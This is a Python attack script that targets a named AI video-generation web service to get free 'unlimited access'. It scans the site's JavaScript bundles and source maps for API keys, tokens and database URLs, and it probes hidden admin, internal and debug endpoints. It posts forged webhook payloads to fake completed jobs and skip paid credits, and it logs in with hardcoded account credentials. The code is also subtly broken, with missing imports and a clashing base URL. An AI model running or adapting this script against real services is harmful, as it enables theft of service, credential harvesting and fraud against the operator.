"""
dig_backend.py — Deep backend probing for viddo.ai unlimited access
Attacks:
 1. Pull Next.js JS bundle, scan for hardcoded keys/coupons/bypass flags
 2. Probe middle-layer with credit-bypass body params
 3. Scan for hidden admin/internal/promo endpoints
 4. Session data decode — look for plan/credits fields
 5. Check for .map source files (FULL server-side code leak)
"""
import requests, json, re, time, base64, urllib.parse
from viddo_unlimited import COOKIES, HEADERS, BASE

session = requests.Session()
session.cookies.update(COOKIES)
session.headers.update(HEADERS)

BASE = "https://www.viewmax.io"
HDRS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0 Safari/537.36",
    "Accept": "*/*",
    "Origin": BASE,
    "Referer": BASE + "/",
}

# Patterns to find in JS source
KEY_PATTERNS = [
    (r'kling[_\-\s]*(?:api[_\-\s]*)?key["\s]*[:=]["\s]*([A-Za-z0-9_\-]{20,})', "KLING_KEY"),
    (r'Authorization["\s]*:["\s]*Bearer\s+([A-Za-z0-9_\-\.]{20,})', "BEARER_TOKEN"),
    (r'sk-[A-Za-z0-9]{20,}', "OPENAI_SK"),
    (r'AIza[A-Za-z0-9_\-]{35}', "GOOGLE_API_KEY"),
    (r'access_key["\s]*[:=]["\s]*["\']([A-Za-z0-9_\-]{20,})["\']', "ACCESS_KEY"),
    (r'secret[_\-]?key["\s]*[:=]["\s]*["\']([A-Za-z0-9_\-]{20,})["\']', "SECRET_KEY"),
    (r'api[_\-]?key["\s]*[:=]["\s]*["\']([A-Za-z0-9_\-]{20,})["\']', "API_KEY"),
    (r'KLING[_A-Z]*["\s]*[:=]["\s]*["\']([A-Za-z0-9_\-]{10,})["\']', "KLING_ENV"),
    (r'VEO[_A-Z]*["\s]*[:=]["\s]*["\']([A-Za-z0-9_\-]{10,})["\']', "VEO_ENV"),
    (r'SORA[_A-Z]*["\s]*[:=]["\s]*["\']([A-Za-z0-9_\-]{10,})["\']', "SORA_ENV"),
    (r'NEXT_PUBLIC[_A-Z]*["\s]*[:=]["\s]*["\']([A-Za-z0-9_\-\.:/]{10,})["\']', "NEXT_PUBLIC_VAR"),
    (r'https?://(?:api\.)?klingai\.com[^\s"\'<>]{0,100}', "KLING_URL"),
    (r'https?://[^\s"\'<>]*kling[^\s"\'<>]{0,80}', "KLING_URL2"),
    (r'https?://[^\s"\'<>]*generativelanguage\.googleapis[^\s"\'<>]{0,100}', "GOOGLE_AI_URL"),
    (r'https?://api\.openai\.com[^\s"\'<>]{0,100}', "OPENAI_URL"),
    (r'https?://[^\s"\'<>]*runway[^\s"\'<>]{0,80}', "RUNWAY_URL"),
    (r'/api/[a-z0-9\-_/]+/webhook', "WEBHOOK_PATH"),
    (r'/api/[a-z0-9\-_/]+/admin', "ADMIN_PATH"),
    (r'/api/[a-z0-9\-_/]+/internal', "INTERNAL_PATH"),
    (r'/api/[a-z0-9\-_/]+/callback', "CALLBACK_PATH"),
    (r'"(/api/[a-zA-Z0-9\-_/]+)"', "API_ROUTE"),
    (r"'(/api/[a-zA-Z0-9\-_/]+)'", "API_ROUTE"),
    (r'eyJ[A-Za-z0-9_\-]{20,}\.eyJ[A-Za-z0-9_\-]{20,}\.[A-Za-z0-9_\-]{20,}', "JWT_TOKEN"),
    (r'Bearer\s+([A-Za-z0-9_\-\.]{20,})', "BEARER"),
    (r'x-api-key["\s]*:["\s]*["\']([A-Za-z0-9_\-]{16,})["\']', "X_API_KEY"),
    (r'database[_\-]?url["\s]*[:=]["\s]*["\']([^"\']{20,})["\']', "DB_URL"),
    (r'postgresql://[^\s"\'<>]{10,}', "PG_URL"),
    (r'mysql://[^\s"\'<>]{10,}', "MYSQL_URL"),
]


async def fetch_text(session, url, timeout=20):
    try:
        async with session.get(url, headers=HDRS, timeout=aiohttp.ClientTimeout(total=timeout)) as r:
            if r.status == 200:
                ct = r.headers.get("Content-Type", "")
                if "html" in ct and "json" not in ct:
                    return None  # skip HTML pages
                return await r.text()
    except Exception:
        pass
    return None


async def fetch_json(session, url, timeout=20):
    try:
        async with session.get(url, headers=HDRS, timeout=aiohttp.ClientTimeout(total=timeout)) as r:
            if r.status == 200:
                return await r.json()
    except Exception:
        pass
    return None


def search_patterns(text, source_url):
    """Search for interesting patterns in JS text."""
    found = {}
    for pattern, label in KEY_PATTERNS:
        matches = re.findall(pattern, text, re.IGNORECASE)
        if matches:
            # Deduplicate
            unique = list(dict.fromkeys(m if isinstance(m, str) else m[0] for m in matches))
            found[label] = unique
    return found


async def get_build_id(session):
    """Extract Next.js build ID from the main page."""
    text = await fetch_text(session, BASE + "/")
    if not text:
        return None
    # Look for buildId in __NEXT_DATA__
    m = re.search(r'"buildId"\s*:\s*"([^"]+)"', text)
    if m:
        return m.group(1)
    # Also try from _buildManifest pattern
    m = re.search(r'/_next/static/([^/]+)/_buildManifest', text)
    if m:
        return m.group(1)
    return None


async def get_all_routes(session, build_id):
    """Get all routes from Next.js build manifest."""
    routes = set()
    
    manifest_url = f"{BASE}/_next/static/{build_id}/_buildManifest.js"
    text = await fetch_text(session, manifest_url)
    if text:
        print(f"[+] Build manifest found: {manifest_url}")
        # Extract all page paths
        paths = re.findall(r'"(/[^"]*)"', text)
        for p in paths:
            if not p.startswith("/_next") and not p.startswith("/__"):
                routes.add(p)
    
    # Also get from __NEXT_DATA__
    main = await fetch_text(session, BASE + "/")
    if main:
        m = re.search(r'id="__NEXT_DATA__"[^>]*>(.*?)</script>', main, re.DOTALL)
        if m:
            try:
                nd = json.loads(m.group(1))
                for page in nd.get("pages", []):
                    routes.add(page)
            except Exception:
                pass
    
    return routes


async def enumerate_chunk_urls(session, build_id):
    """Get list of JS chunk filenames from the chunk manifest."""
    chunk_urls = []
    
    # Pages manifest
    pages_manifest = await fetch_json(session, f"{BASE}/_next/static/{build_id}/_ssgManifest.js")
    
    # Try the chunks manifest  
    for manifest_path in [
        f"/_next/static/{build_id}/_buildManifest.js",
        f"/_next/static/chunks/framework.js",
        f"/_next/static/chunks/main.js",
    ]:
        text = await fetch_text(session, BASE + manifest_path)
        if text:
            # Find chunk references like "abc123.js" or chunk IDs
            found_chunks = re.findall(r'"([a-f0-9]{16,})"', text)
            for c in found_chunks[:30]:
                chunk_urls.append(f"{BASE}/_next/static/chunks/{c}.js")
            
            # Also find named chunks
            named = re.findall(r'"([a-zA-Z0-9\-_]+\.js)"', text)
            for n in named[:30]:
                chunk_urls.append(f"{BASE}/_next/static/chunks/{n}")
    
    return chunk_urls


async def scrape_main_page_chunks(session):
    """Get all script src URLs from the main page."""
    text = await fetch_text(session, BASE + "/")
    if not text:
        return [], None
    
    # Extract build ID
    build_id = None
    m = re.search(r'"buildId"\s*:\s*"([^"]+)"', text)
    if m:
        build_id = m.group(1)
        print(f"[+] Build ID: {build_id}")
    
    # Extract all script URLs
    scripts = re.findall(r'src="(/_next/static/[^"]+\.js)"', text)
    
    # Also check for deferred/lazy chunks referenced in the JS
    chunk_urls = [BASE + s for s in scripts]
    
    return chunk_urls, build_id


async def scan_chunk(session, url, results):
    """Download and scan a JS chunk for secrets."""
    text = await fetch_text(session, url)
    if not text or len(text) < 100:
        return
    
    found = search_patterns(text, url)
    if found:
        chunk_name = url.split("/")[-1]
        for label, values in found.items():
            if label in ("API_ROUTE", "NEXT_PUBLIC_VAR"):
                # These are common, only show unique ones
                for v in values[:5]:
                    if v not in results.get(label, []):
                        results.setdefault(label, []).append((chunk_name, v))
            else:
                for v in values:
                    key = (label, v[:80])
                    if key not in results.get("_seen", set()):
                        results.setdefault("_seen", set()).add(key)
                        results.setdefault(label, []).append((chunk_name, v[:120]))
                        print(f"  !! [{label}] in {chunk_name}: {v[:80]}")
    
    # Also check for source map reference
    if "//# sourceMappingURL=" in text:
        m = re.search(r'//# sourceMappingURL=(.+)$', text, re.MULTILINE)
        if m:
            map_ref = m.group(1).strip()
            print(f"  [MAP] Source map referenced in {url.split('/')[-1]}: {map_ref}")
            results.setdefault("_maps", []).append((url, map_ref))
    
    # Look for all /api/ paths mentioned
    api_paths = set(re.findall(r'["\`](\s*/api/[a-zA-Z0-9\-_/\$\{\}]+)["\`]', text))
    for p in api_paths:
        p = p.strip()
        if len(p) > 5 and len(p) < 100:
            results.setdefault("_api_paths", set()).add(p)


async def probe_api_paths(session, paths):
    """Probe discovered API paths for interesting behavior."""
    print(f"\n[*] Probing {len(paths)} discovered API paths...")
    interesting = []
    
    # Login first
    jar = aiohttp.CookieJar(unsafe=True)
    login_hdrs = dict(HDRS)
    login_hdrs["Content-Type"] = "application/json"
    
    async with aiohttp.ClientSession(cookie_jar=jar) as auth_session:
        await auth_session.post(f"{BASE}/api/auth/sign-in/email",
                                json={"email": "quicken-jolt-crave@duck.com",
                                      "password": "quicken-jolt-crave@duck.com",
                                      "rememberMe": True},
                                headers=login_hdrs)
        
        for path in sorted(paths)[:100]:
            # Skip known paths
            if any(k in path for k in ["/auth/", "/video-generation/generate", "/stripe/"]):
                continue
            full_url = BASE + path.replace("${", "{").replace("}", "}")
            if "{" in full_url:
                continue  # skip dynamic routes for now
            
            try:
                async with auth_session.get(full_url, headers=login_hdrs,
                                             timeout=aiohttp.ClientTimeout(total=8)) as r:
                    if r.status not in (404, 405, 500):
                        try:
                            body = await r.text()
                            body_preview = body[:100].replace('\n', ' ')
                        except Exception:
                            body_preview = "(binary)"
                        print(f"  [{r.status}] GET {path} -> {body_preview}")
                        interesting.append((r.status, "GET", path, body_preview))
            except Exception:
                pass
    
    return interesting


async def check_source_maps(session, map_refs):
    """Try to fetch source map files which contain actual server source."""
    print(f"\n[*] Checking {len(map_refs)} source map references...")
    for chunk_url, map_ref in map_refs[:10]:
        # Resolve relative map URL
        if map_ref.startswith("http"):
            map_url = map_ref
        else:
            base_path = "/".join(chunk_url.split("/")[:-1])
            map_url = base_path + "/" + map_ref
        
        text = await fetch_text(session, map_url)
        if text and len(text) > 100:
            print(f"  [!!!] SOURCE MAP ACCESSIBLE: {map_url}")
            # Search for secrets in source map
            found = search_patterns(text, map_url)
            for label, vals in found.items():
                if label != "_seen":
                    print(f"    [{label}]: {vals[:3]}")
            # Save it
            with open(f"_sourcemap_{map_ref[:30].replace('/','-')}.json", "w") as f:
                f.write(text[:500000])
            print(f"    Saved to _sourcemap_{map_ref[:30].replace('/','-')}.json")
        else:
            print(f"  [ ] Not accessible: {map_url}")


async def check_next_data(session, build_id, routes):
    """Check /_next/data/ endpoints for server-side data."""
    print(f"\n[*] Checking /_next/data/ endpoints...")
    interesting_pages = ["/", "/dashboard", "/generate", "/credits", "/pricing", "/admin", "/api-docs"]
    
    for page in interesting_pages:
        if page == "/":
            url = f"{BASE}/_next/data/{build_id}/index.json"
        else:
            url = f"{BASE}/_next/data/{build_id}{page}.json"
        
        text = await fetch_text(session, url)
        if text:
            print(f"  [+] /_next/data{page}.json -> {text[:200]}")


async def probe_webhook_paths(session):
    """Probe likely webhook/callback paths that might bypass auth."""
    webhook_paths = [
        "/api/webhooks/kling",
        "/api/webhooks/stripe",
        "/api/webhooks/veo",
        "/api/webhook/kling",
        "/api/webhook/stripe",
        "/api/webhook/completion",
        "/api/callback/kling",
        "/api/callback/video",
        "/api/kling/webhook",
        "/api/kling/callback",
        "/api/video-generation/callback",
        "/api/video-generation/webhook",
        "/api/video-generation/complete",
        "/api/video/webhook",
        "/api/video/callback",
        "/api/generation/callback",
        "/api/ai/callback",
        "/api/stripe/webhook",
        "/api/stripe/webhooks",
        "/api/payments/webhook",
        "/api/admin/credits",
        "/api/admin/users",
        "/api/internal/credits",
        "/api/internal/add-credits",
        "/api/cron/process-videos",
        "/api/cron/refund",
        "/api/debug/credits",
        "/api/test/generate",
    ]
    
    print(f"\n[*] Probing {len(webhook_paths)} webhook/admin paths...")
    
    auth_hdrs = dict(HDRS)
    auth_hdrs["Content-Type"] = "application/json"
    
    jar = aiohttp.CookieJar(unsafe=True)
    async with aiohttp.ClientSession(cookie_jar=jar) as s:
        await s.post(f"{BASE}/api/auth/sign-in/email",
                     json={"email": "quicken-jolt-crave@duck.com",
                           "password": "quicken-jolt-crave@duck.com",
                           "rememberMe": True},
                     headers=auth_hdrs)
        
        for path in webhook_paths:
            # Try GET
            try:
                async with s.get(BASE + path, headers=auth_hdrs,
                                  timeout=aiohttp.ClientTimeout(total=8)) as r:
                    if r.status != 404:
                        body = (await r.text())[:150].replace('\n', ' ')
                        print(f"  [{r.status}] GET {path} -> {body}")
            except Exception:
                pass
            
            # Try POST with fake Kling webhook payload
            if "kling" in path.lower() or "callback" in path.lower() or "webhook" in path.lower() or "complete" in path.lower():
                fake_payloads = [
                    {"task_id": "test123", "status": "succeed", "task_result": {"videos": [{"url": "https://example.com/video.mp4"}]}},
                    {"id": "test123", "status": "completed", "output": {"video_url": "https://example.com/video.mp4"}},
                    {"generationId": "test123", "status": "completed"},
                ]
                for payload in fake_payloads:
                    try:
                        async with s.post(BASE + path, json=payload, headers=auth_hdrs,
                                           timeout=aiohttp.ClientTimeout(total=8)) as r:
                            if r.status != 404:
                                body = (await r.text())[:150].replace('\n', ' ')
                                print(f"  [{r.status}] POST {path} (kling payload) -> {body}")
                                break
                    except Exception:
                        pass


async def main():
    connector = aiohttp.TCPConnector(limit=20)
    async with aiohttp.ClientSession(connector=connector) as session:
        
        print("=" * 60)
        print("PHASE 1: Scraping JS chunks from main page")
        print("=" * 60)
        chunk_urls, build_id = await scrape_main_page_chunks(session)
        print(f"  Found {len(chunk_urls)} script URLs, build_id={build_id}")
        
        if build_id:
            print("\nPHASE 2: Build manifest -> all routes")
            routes = await get_all_routes(session, build_id)
            print(f"  Found {len(routes)} routes: {sorted(routes)[:20]}")
        else:
            routes = set()
        
        print(f"\nPHASE 3: Scanning {len(chunk_urls)} JS chunks for secrets...")
        results = {}
        tasks = [scan_chunk(session, url, results) for url in chunk_urls]
        await asyncio.gather(*tasks)
        
        # Also scan extra chunk URLs derived from build manifest
        if build_id:
            extra_chunks = await enumerate_chunk_urls(session, build_id)
            extra_chunks = [u for u in extra_chunks if u not in chunk_urls]
            print(f"  Scanning {len(extra_chunks)} additional chunks...")
            tasks2 = [scan_chunk(session, url, results) for url in extra_chunks[:50]]
            await asyncio.gather(*tasks2)
        
        # Print summary of findings
        print("\n" + "=" * 60)
        print("CHUNK SCAN RESULTS")
        print("=" * 60)
        
        api_paths = results.get("_api_paths", set())
        print(f"\nAPI paths found in JS: {len(api_paths)}")
        for p in sorted(api_paths):
            print(f"  {p}")
        
        for label in results:
            if not label.startswith("_") and results[label]:
                print(f"\n[{label}] ({len(results[label])} finds):")
                for chunk, val in results[label][:10]:
                    print(f"  {chunk}: {val}")
        
        # Source maps
        map_refs = results.get("_maps", [])
        if map_refs:
            await check_source_maps(session, map_refs)
        
        # Phase 4: next/data
        if build_id:
            await check_next_data(session, build_id, routes)
        
        # Phase 5: Webhook probe
        await probe_webhook_paths(session)
        
        # Phase 6: Probe all discovered API paths
        if api_paths:
            await probe_api_paths(session, api_paths)
        
        print("\n=== DONE ===")
        
        # Save all results
        save_data = {
            "build_id": build_id,
            "routes": list(routes),
            "api_paths": list(api_paths),
            "findings": {k: v for k, v in results.items() if not k.startswith("_") and k != "_seen"}
        }
        with open("_backend_dig.json", "w") as f:
            json.dump(save_data, f, indent=2, default=str)
        print("Full results saved to _backend_dig.json")


asyncio.run(main())
